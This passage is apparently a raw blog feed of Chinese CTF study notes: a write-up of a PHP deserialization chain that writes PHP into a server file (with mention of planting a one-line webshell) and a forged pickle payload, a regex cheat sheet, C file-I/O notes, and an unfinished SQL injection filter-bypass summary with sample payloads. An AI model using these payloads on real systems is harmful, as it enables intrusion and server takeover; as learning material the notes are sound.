class="hljs">b&#39;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x037bmk\x94\x8c\x03vip\x94\x89ub.&#39;</code></pre><p>似乎8是很难进行比较，然后就阔以在相应的地方进行改动。8过如果属性数过多有些容易看漏，而pickletools模块阔以帮我们自动反序列化，用法8再赘述</p><p>于是在反序列化后，将属性vip的值由False改为True，再经过base64编码，就构造出payload了……</p><h3 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h3><p>然后是SSTI注入，还没学，这里先填个坑，草草草草草草草草草草草草草草草草草草草草草草草草草草草草</p><h2 id="ez-unserialize-php反序列化"><a href="#ez-unserialize-php反序列化" class="headerlink" title="ez_unserialize(php反序列化)"></a>ez_unserialize(php反序列化)</h2><p>先帖源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;    <span class="hljs-comment">//Ok，这次是真正的反序列化实践了!</span><br>        <span class="hljs-variable language_">$this</span>-&gt;var1 = <span class="hljs-variable">$p1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;var2 = <span class="hljs-variable">$p2</span>;<br>    &#125;      <span class="hljs-comment">//无感</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;var1-&gt;secret = <span class="hljs-variable language_">$this</span>-&gt;var2;   <span class="hljs-comment">//-&gt;:表示引用对象的成员</span><br>    &#125;        <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">Hello</span>();   <span class="hljs-comment">//调用Hello方法</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;<br>        <span class="hljs-variable">$p2</span>-&gt;<span class="hljs-variable">$p1</span>();                 <span class="hljs-comment">//执行p2类下的p1函数</span><br>    &#125;                      <span class="hljs-comment">//先过</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to 西电战役CTF!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span></span>)</span>&#123;  <br>        <span class="hljs-variable language_">$this</span>-&gt;var1 = <span class="hljs-variable">$p1</span>;   <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;var1);   <span class="hljs-comment">//call_user_func调用$this-&gt;var1的函数，有啥意义?</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p1</span>, <span class="hljs-variable">$p2</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;var1 = <span class="hljs-variable">$p1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;var2 = <span class="hljs-variable">$p2</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;sandbox&quot;</span>;    <span class="hljs-comment">//关键词？?</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))&#123;   <span class="hljs-comment">//is_dir():检查$dir是否为1个文件夹（若$dir为相对路径，则按照当前工作目录检查），是则返回TRUE(bool)，否则返回FALSE</span><br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;sandbox&#x27;</span>);  <span class="hljs-comment">//mkdir创建文件夹，mkdir(path,mode,recursive(可选，看不懂),context(可选，看不懂))  翻译:创建叫sandbox的文件夹，可访问</span><br>        &#125;<br>        <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;sandbox&#x27;</span>);  <span class="hljs-comment">//chdir：改变当前目录为&#x27;sandbox&#x27;</span><br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;var1 . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]) . <span class="hljs-string">&quot;.php&quot;</span>; <br>        <span class="hljs-comment">/*$_SERVER 是一个包含诸如头信息（header）、路径（path）和脚本位置（script locations）的数组,超全局变量。</span><br><span class="hljs-comment">        remote_addr:正在浏览当前页面用户的 IP 地址*/</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[&lt;&gt;?]/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;var2)) &#123;<span class="hljs-comment">//操了，又是正则匹配；翻译: 在*后加?表示非贪婪最小匹配，表达式匹配&lt;&gt;，总感觉哪里有些不对</span><br>        <span class="hljs-comment">//确实不对，他的意思是禁止左括号、右括号、问号，但这也是阔以绕过的----当被匹配的参数$this-&gt;var2为数组时，即可绕过(虽然会警告但是仍阔以执行)</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hhhhacker!!!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$this</span>-&gt;var2); <span class="hljs-comment">//网上可搜到该函数漏洞，把1个字符串写到文件里(指菜刀payload)，没使用FILE_APPEND追加</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];   <span class="hljs-comment">//追踪!!!!</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br>&#125; <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] == <span class="hljs-string">&#x27;phpinfo&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();   <span class="hljs-comment">//输出关于php配置的信息(完了，一点不懂，但这肯定是有用的)</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>阔以看到里面有个write函数，作用是结合用户输入的参数读取文件，于是就想到要调用这个函数，咋调用捏?<br>然后阔以看到c类里有个__call(的)魔术函数，里面的call_user_func调用$this-&gt;var1的函数，自然也阔以调用write函数<br>那么如何调用__call呢？这就要利用__call作为魔术函数的特性，__call函数在对象调用1个不可访问(b不存在)的方法时会被调用</p><p>那么看看我们阔以控制的变量$a，在被反序列化后就啥也没干了，这有啥漏洞呢? </p><p>继续审，看到class B里的__set()函数阔以执行，然后搜索__set函数怎样能被调动: 在给不可访问或不存在的属性赋值时set会被调用, so….</p><p>大佬的构造是:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>[]=<span class="hljs-string">&quot;&lt;?php phpinfo();?)&gt;&quot;</span>  <span class="hljs-comment">//创造数组，因为数组可以绕过preg_match，里面是payload</span><br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$content</span>);           <span class="hljs-comment">//数组塞进d，D类里有write(),创建文件夹sandbox，然后md5($this-&gt;var1.ip地址).&quot;.php&quot;;然后$this-&gt;var2作为php语句写入文件 </span><br><span class="hljs-variable">$array</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$d</span>,<span class="hljs-string">&#x27;write&#x27;</span>);       <span class="hljs-comment">//array()将2个参数填入数组</span><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$array</span>);              <span class="hljs-comment">//C类有__call()，__call()里有call_user_func(this-&gt;var1)</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();                   <span class="hljs-comment">//B类的__set($p1,$p2)执行p2类下的p1函数，p2-&gt;p1()，__construct()啥也没干</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>);             <span class="hljs-comment">//A类有__destruct():$this-&gt;var1-&gt;secret = $this-&gt;var2; </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);         <br></code></pre></td></tr></table></figure><p>然后我们理解一下，在payload被反序列化后，__destruct()通常在脚本结束前被调用执行，于是A类的__destruct被调用，$b-&gt;secret&#x3D;$c，然而我们构造的$b为B类属性，没有$secret，因此相当于访问了1个8存在的属性，于是就会调用B类的__set()方法, 但__set()的参数是啥? 可以先猜一波是$c里的$array里的$d,’write’(百度一波)，然后$d的write函数被调用，$d-&gt;$var1&#x3D;’’, 即没有，$d-&gt;var2&#x3D;$content，即1个数组，阔以绕过preg_match，虽然触发警告但仍然阔以成功执行 file_put_contents()函数，于是文件就被写入了</p><p>另外要学会看php的官方文档</p><p>然后我们访问这个文件，里面的php代码就会被执行，然后阔以把content设置为一句话木马，就可以用菜刀连接了</p><p>这道题让我发现了自己的代码审计水平有多菜</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>之前没做过类似的题，这次记录一下</p><p>大致就是在一些音频编辑软件里打开，俺用的Audacity，但是听说看8了5.1声道，可以用Adoble Audition</p><p>然后查看里面的不同声道，发现里面有2个声道里面只有3个调调，联想到摩斯电码。如图</p><p><img src="/images/%E6%8A%97%E7%96%ABctf/misc(1).png"></p><p>然后根据规律，出现从不连续出现的应该是横杠(间隔)，其他两个代表什么分别试试就知道了</p><p>解出来1个乱码，也8知道是8是，因为没法提交验证了。。</p><h2 id="rpg"><a href="#rpg" class="headerlink" title="rpg"></a>rpg</h2><p>Noah师傅出的很有意思的1道题</p><p>里面是个游戏，找遍了地图也没啥可以触发的。于是意识到需要通过改游戏角色的金币来获取flag</p><p>于是把下载的文件翻了个遍，最后发现.rvdata后缀的文件很可疑，因为每创建1个存档，就会多出1个这个文件。于是意识到阔以通过这个方式修改存档，但打开后是部分可识别，部分则是乱码，改了编码方式也没用。于是搜索.rvdata相关内容，很幸运的找到一个网站，阔以在线识别并修改.rvdata的数据:<a href="https://www.saveeditonline.com/">链接</a>，往进去一拖分分钟搞定</p><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>就提一下，有的是RGB全点，有的是只点1个，但不是瞎几把乱点….</p><h2 id="队伍赛-base的revenerge"><a href="#队伍赛-base的revenerge" class="headerlink" title="队伍赛-base的revenerge"></a>队伍赛-base的revenerge</h2><p>下载打开，类似base64编码的乱码，推荐1个8错的自动识别编码的在线网站: <a href="https://cyberchef.bacde.me/">cyberchef</a></p><p>然后解码1次后还是乱码，而且这个乱码完全没法识别，没啥规律，也8是base58，如下图</p><p><img src="/images/%E6%8A%97%E7%96%ABctf/misc(2).png"></p><p>网上找找资料，符合这种乱码的有几种可能:<br>1、词频加密(只在某文章出现过，意思是把不同符号出现的次数从大到小或从小到大排列，然后看是8是能组成有规律的一串字符)<br>2、UUencode，特点是有很多字符<br>3、xxencode，文本和base64类似，但比base64多了个’-‘字符，少了个’&#x2F;‘字符</p><p>但是将部分文本拖入在线网站解码后，排除234的可能性，至于1，真的有可能吗?写个脚本试试</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛事</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式备忘速查</title>
    <link href="/2022/01/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%80%9F%E6%9F%A5/"/>
    <url>/2022/01/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%80%9F%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<p>因为平时不怎么用，而要用的时候老是忘….就干脆把常用的做个笔记</p><h1 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h1><h2 id=""><a href="#" class="headerlink" title="^:"></a>^:</h2><p>1、匹配输入字符串的开始位置<br>2、[^]表示[]内的内容不匹配<br>eg:<br>^[^ABC]$</p><h2 id="-1"><a href="#-1" class="headerlink" title="$:"></a>$:</h2><p>匹配输入字符串的结尾位置</p><h2 id="-2"><a href="#-2" class="headerlink" title="+:"></a>+:</h2><p>匹配单个或多个<br>eg:<br>^[0-9]$匹配单个数字，^[0-9]+$匹配多个数字)<del>(可不是拼接的意思)</del><br>^fu+Ck$，可匹配fuCk、fuuuuuuuuuuuuuuuuuuuuCk、fuuuuCk,不可匹配fck(+前的字符至少出现1次)</p><h2 id="-3"><a href="#-3" class="headerlink" title="*:"></a>*:</h2><p>和+类似，<em>前面的字符可出现1次、n次，也可不出现<br>eg:<br>^abc</em>$可匹配abcccccccccc、ab、a</p><h2 id="-4"><a href="#-4" class="headerlink" title="?:"></a>?:</h2><p>和+类似，但?前的字符只能出现0或1次</p><h2 id="-5"><a href="#-5" class="headerlink" title="[]:"></a>[]:</h2><p>里面是你要匹配的内容<br>eg: ^[0-9a-z_-]$，匹配字符a-z、0-9、下划线_和-</p><h2 id="-6"><a href="#-6" class="headerlink" title="{}:"></a>{}:</h2><p>限定[]所匹配的字符串的长度<br>用法:{a,b}，{n,}(最少匹配n次)，{n}(匹配n次)</p><p>eg: ^[a-z]{3-9}$无法匹配aaaaaaaaaaaaaaaaaaaaaaaa和aa，因为它们太长或太短</p><h1 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h1><h2 id="s"><a href="#s" class="headerlink" title="\s:"></a>\s:</h2><p>匹配所有空白符</p><h2 id="s-1"><a href="#s-1" class="headerlink" title="\s:"></a>\s:</h2><p>匹配所有非空白符，但不包括换行</p><p>所以^[\s\S]$表示匹配所有字符</p><h2 id="w"><a href="#w" class="headerlink" title="\w"></a>\w</h2><p>匹配字母、数字、下划线，即[A-Za-z_0-9]</p><h2 id="d"><a href="#d" class="headerlink" title="\d"></a>\d</h2><p>匹配数字</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>open和fopen区别、虚拟内存</title>
    <link href="/2021/12/29/open%E5%92%8Cfopen%E5%8C%BA%E5%88%AB/"/>
    <url>/2021/12/29/open%E5%92%8Cfopen%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>其实没必要水的，然而就是老记混open和fopen，于是顺便学学其他的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span>   <span class="hljs-comment">//文件控制库</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> f1=open(<span class="hljs-string">&quot;D:\\desktop\\dick.txt&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(f1==<span class="hljs-number">-1</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Err0r!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-type">char</span> ch1[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> len=read(f1,ch1,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,ch1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;len=%d&quot;</span>,len);<br>    close(f1);<br><br>    <span class="hljs-comment">/*----------------------------------*/</span><br>    <br>    FILE *f2=fopen(<span class="hljs-string">&quot;D;\\desktop\\dick.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-type">char</span> ch2[<span class="hljs-number">100</span>];<br>    fread(ch2,<span class="hljs-number">1</span>,<span class="hljs-number">100</span>,f2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,ch2);<br>    fclose(f2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后，fopen是标准c库函数，open是系统函数，使用open返回的是文件描述符，而是用fopen返回的则是文件指针</p><h2 id="文件描述符和文件指针关系："><a href="#文件描述符和文件指针关系：" class="headerlink" title="文件描述符和文件指针关系："></a>文件描述符和文件指针关系：</h2><p>程序运行后变成进程，在内存的进程管理中，有个文件描述符表，每打开一个文件，就占用一个文件描述符<del>(算了反正半懂不懂也是忘)</del><br>文件描述符才能找到文件在磁盘(即虚拟内存)中对应的位置</p><p>文件指针就是文件描述符和缓冲区(在物理内存上)的封装，数据先写到缓冲区，再写到磁盘</p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>电脑中所有运行的程序都需要内存来执行,如果执行的程序很大，会导致内存消耗殆尽。为了解决这个问题，WINDOWS运用了虚拟内存技术，即拿出一部分硬盘空间来充当内存使用，这部分空间即称为虚拟内存(作为内存使用的一部分硬盘空间)，虚拟内存在硬盘上的存在形式就是 C:\PAGEFILE.SYS</p><p>与虚拟内存相对应的就是物理内存，绝大部分程序8会直接访问物理内存(危险)，物理内存一般由操作系统访问</p><h2 id="fopen和open区别"><a href="#fopen和open区别" class="headerlink" title="fopen和open区别"></a>fopen和open区别</h2><p>所以综上所述就是，标准c库函数操控系统函数访问文件，标准c库函数无法直接读写文件</p><p>以及在读写时标准c库函数比系统函数多了个缓冲区的流程</p><p>卧槽我居然看懂了我好牛逼??</p><h2 id="fopen、open参数"><a href="#fopen、open参数" class="headerlink" title="fopen、open参数"></a>fopen、open参数</h2><p>open():<br>O_RDONLY　　只读打开<br>O_WRONLY　 只写打开<br>O_RDWR 读写打开</p><p>fopen():<br>r<br>w<br>a: 追加到一个文件(写入时在末尾写写入)<br>“r+”打开一个用于更新的文件，可读取也可写入。该文件必须存在。<br>“w+”创建一个用于读写的空文件。<br>“a+”打开一个用于读取和追加的文件。</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
      <tag>编程</tag>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入姿势总结</title>
    <link href="/2021/12/17/sql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <url>/2021/12/17/sql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>大佬绕过<br>很久没刷sql注入了，然后就忘得差8多了，为此觉得有必要总结一手</p><!-- about --><p>注意在hackbar里输入+之类的符号和在url栏里输入是有差别的</p><h1 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过"></a>关于绕过</h1><h2 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h2><p>当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法</p><h3 id="用-将原有的’转义掉"><a href="#用-将原有的’转义掉" class="headerlink" title="用\将原有的’转义掉"></a>用\将原有的’转义掉</h3><p>eg:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=1\&amp;password=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure><p>(此处注意，如果浏览器使用burp代理或hackbar发送,注意检查把payload中的’&#39;换成’\‘，否则会发现burp在发送请求时’&#39;已经被转义，图为burp代理下用hackbar发送请求结果)<br><img src="/images/sql%E6%B3%A8%E5%85%A5(1).png"></p><h3 id="用char-函数绕过"><a href="#用char-函数绕过" class="headerlink" title="用char()函数绕过"></a>用char()函数绕过</h3><p>eg:<br>将 where table_schema&#x3D;’c’替换为where table_schema&#x3D;char(99)</p><h3 id="宽字节攻击绕过"><a href="#宽字节攻击绕过" class="headerlink" title="宽字节攻击绕过"></a>宽字节攻击绕过</h3><p>宽字节注入原理：<br>GBK 占用两字节<br>ASCII占用一字节<br>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。<br>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="注释绕过空格"><a href="#注释绕过空格" class="headerlink" title="注释绕过空格"></a>注释绕过空格</h3><p>eg: </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">/*!select*/</span><span class="hljs-comment">/*!version()*/</span><br></code></pre></td></tr></table></figure><p>emmmmmm….</p><h2 id="等于号绕过"><a href="#等于号绕过" class="headerlink" title="等于号绕过"></a>等于号绕过</h2><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;geek&#x27;</span><br><span class="hljs-keyword">where</span> (table_schema) <span class="hljs-keyword">like</span> (<span class="hljs-string">&#x27;geek&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h2><h3 id="双写绕过-大小写绕过"><a href="#双写绕过-大小写绕过" class="headerlink" title="双写绕过 &amp;&amp; 大小写绕过"></a>双写绕过 &amp;&amp; 大小写绕过</h3><p>selselectect<br>mysql是8分大小写的，你懂的</p><h3 id="16进制-绕过被屏蔽的表名、列名、数据库名"><a href="#16进制-绕过被屏蔽的表名、列名、数据库名" class="headerlink" title="16进制: 绕过被屏蔽的表名、列名、数据库名"></a>16进制: 绕过被屏蔽的表名、列名、数据库名</h3><p>用16进制编码代替关键字，只可用来查询被屏蔽的表名等(8能绕过select)<br>比如’admin’的16进制:<br>0x61<br>0x64<br>0x6d<br>0x69<br>0x6e<br>于是:<br>select * from user where username &#x3D; 0x61646d696e;</p><h2 id="关键字过滤-代替表"><a href="#关键字过滤-代替表" class="headerlink" title="关键字过滤-代替表"></a>关键字过滤-代替表</h2><p>空格: &#x2F;**&#x2F; %20 %a0 %0a +<br>and: &amp;&amp;<br>or: ||<br>limit: having<br>select: ⼀般是堆叠注⼊</p><p>information_schema:<br>mysql.innodb_table_stats<br>innodb_index_stats<br>sys.schema_table_statistics_with_buffer<br>sys.schema_auto_increment_columns</p><h3 id="handler绕过select过滤"><a href="#handler绕过select过滤" class="headerlink" title="handler绕过select过滤"></a>handler绕过select过滤</h3><p>handler是mysql专用的</p><h1 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h1><p>虽说应该记住，但不练手老是忘…<br>group_concat(id,username,passowrd) from table1;<br>group_concat: 把column里的所有内容用,连成1个<br>database()<br>查询schema:<br>-1’ ununionion seleselectct 1,2,schema_name frofromm infoorrormation_schema.schemata;#    &#x2F;&#x2F;此处是information_schema.schemata<br>show databases;</p><h1 id="基础有回显的注入"><a href="#基础有回显的注入" class="headerlink" title="基础有回显的注入"></a>基础有回显的注入</h1><h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><h3 id="什么是双查询注入"><a href="#什么是双查询注入" class="headerlink" title="什么是双查询注入"></a>什么是双查询注入</h3><p>双查询注入，俺的理解大概就是就是select语句里再套1个select，比如: select concat((select database()));</p><h3 id="双查询注入原理"><a href="#双查询注入原理" class="headerlink" title="双查询注入原理"></a>双查询注入原理</h3><p>就是利用报错来回显数据<br>原理: 